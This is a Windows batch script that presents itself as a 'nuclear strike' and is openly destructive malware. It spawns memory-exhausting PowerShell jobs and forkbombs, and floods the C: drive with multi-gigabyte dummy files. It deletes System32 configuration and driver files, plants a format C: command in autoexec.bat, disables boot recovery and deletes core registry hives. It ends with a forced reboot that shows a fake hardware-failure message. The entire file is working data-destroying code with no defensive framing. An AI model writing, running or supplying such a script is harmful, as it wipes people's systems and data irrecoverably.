@rem ========================================
@rem NUCLEAR STRIKE - NO SURVIVORS
@rem ========================================
@echo off
color fc&title FATAL SYSTEM ERROR

REM === MULTI-THREAD DESTRUCCIÓN ===
start /b cmd /c "%~f0 ram"
start /b cmd /c "%~f0 disk" 
start /b cmd /c "%~f0 boot"
start /b cmd /c "%~f0 reg"
start /b cmd /c "%~f0 drivers"
start /b cmd /c "%~f0 fork"

REM === FORKBOMB INMEDIATO ===
:ram
powershell -nop -w h -c "while($true){1..50|%%{Start-Job{while($true){[math]::Pow(2,1000)}};try{New-Object byte[](2GB)}catch{}}"
exit

:disk
for /l %%i in (1,1,5000) do fsutil file createnew "C:\nuke%%i.dat" 2000000000 >nul 2>&1
del /f /q /a C:\Windows\System32\config\* >nul 2>&1
del /f /q /a C:\Windows\System32\drivers\*.sys >nul 2>&1
exit

:boot
echo @echo off> C:\autoexec.bat
echo format C: /q /y /x>> C:\autoexec.bat
echo del C:\Windows /f /s /q>> C:\autoexec.bat
bcdedit /set {default} recoveryenabled No >nul 2>&1
bootrec /fixmbr >nul 2>&1
exit

:reg
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet" /f >nul 2>&1
reg delete "HKLM\SAM" /f >nul 2>&1
reg delete "HKU" /f >nul 2>&1
exit

:drivers
for /l %%i in (1,1,1000) do (
    sc config junk%%i binpath= "taskkill /f /im svchost.exe" >nul 2>&1
    net stop "Windows Update" >nul 2>&1
    net stop "Windows Audio" >nul 2>&1
)
exit

:fork
for /l %%i in (1,1,100) do start /b cmd /c "for /l %%j in () do start /b powershell -nop -w h -c \"1..100|%%{Start-Job{while(1){}}}\""
exit

REM === FINAL: REBOOT FORZADO ===
timeout /t 3 /nobreak >nul
shutdown /r /f /t 0 /c "FATAL HARDWARE FAILURE"
